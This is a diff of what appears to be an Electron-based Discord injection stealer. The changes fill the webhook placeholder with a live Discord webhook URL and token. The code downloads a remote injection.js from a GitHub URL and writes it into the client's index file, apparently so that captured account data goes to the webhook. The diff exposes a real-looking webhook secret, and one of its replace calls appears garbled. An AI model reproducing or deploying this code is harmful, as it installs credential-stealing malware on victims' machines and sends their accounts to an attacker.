@@ -12,7 +12,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "https://canary.discord.com/api/webhooks/1383978666400288809/H0eNloZc_XsK5XGM4fl7ALenIsyD-HIU_7mFIyliYVTnwOV1lyjURm5MKK5kaZabTjNv",
     injection_url: "https://raw.githubusercontent.com/lotusknig/lotus-knight.github.io/refs/heads/main/injection.js",
     filters: {
         urls: [
@@ -543,7 +543,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
+          res.replace('https://canary.discord.com/api/webhooks/1383978666400288809/H0eNloZc_XsK5XGM4fl7ALenIsyD-HIU_7mFIyliYVTnwOV1lyjURm5MKK5kaZabTjNv', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
